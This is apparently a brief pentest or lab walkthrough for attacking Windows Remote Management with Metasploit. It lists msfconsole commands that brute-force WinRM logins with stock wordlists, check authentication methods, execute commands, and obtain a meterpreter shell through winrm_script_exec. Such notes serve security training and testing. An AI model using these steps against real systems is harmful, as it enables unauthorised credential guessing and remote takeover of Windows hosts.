WinRM

Windows Remote Management (WinRM) is a Microsoft technology that allows you to manage Windows computers remotely. 
It is based on the Web Services Management (WS-Management) protocol, which is a standard protocol for managing systems over a network. 

By default WinRM service uses port 5985 for HTTP. We will run the metasploit winmi_login module to find the
valid users and their passwords.
-msfconsole -q
-use auxiliary/scanner/winrm/winrm_login
-set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
-set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Checking WinRM supported authentication method using an auxiliary module.
This is very important to know, before we try to connect to the WinRM service. We need to use
a valid authentication method while connecting to the service
-use auxiliary/scanner/winrm/winrm_auth_methods

 Execute command on the target server using winrm_cmd module. For this you need username and password
-use auxiliary/scanner/winrm/winrm_cmd

We will use the winrm_exec exploit module to get the meterpreter shell.
-use exploit/windows/winrm/winrm_script_exec
-set FORCE_VBS true
